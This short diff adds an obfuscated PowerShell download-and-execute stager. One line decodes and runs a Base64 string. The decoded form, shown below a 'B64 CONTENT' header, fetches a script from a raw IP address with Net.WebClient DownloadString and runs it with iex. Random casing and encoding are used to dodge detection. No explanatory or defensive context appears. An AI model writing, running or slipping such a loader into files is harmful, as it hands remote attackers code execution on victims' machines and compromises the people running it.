@@ -1,0 +1,7 @@
+iex([SYStem.text.enCOdINg]::utF8.gETstRINg([syStEm.CONvErt]::fromBASe64striNg('CmlleCAoTmV3LU9iamVjdCBOZXQud2ViQ2xJZU50KS5ET1duTG9BRFN0ckluRygiaHR0cDovLzUyLjE4My43OS45NDo4MC9UWUJNa1Rmc1EiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+iex (New-Object Net.webClIeNt).DOWnLoADStrInG("http://52.183.79.94:80/TYBMkTfsQ")
+
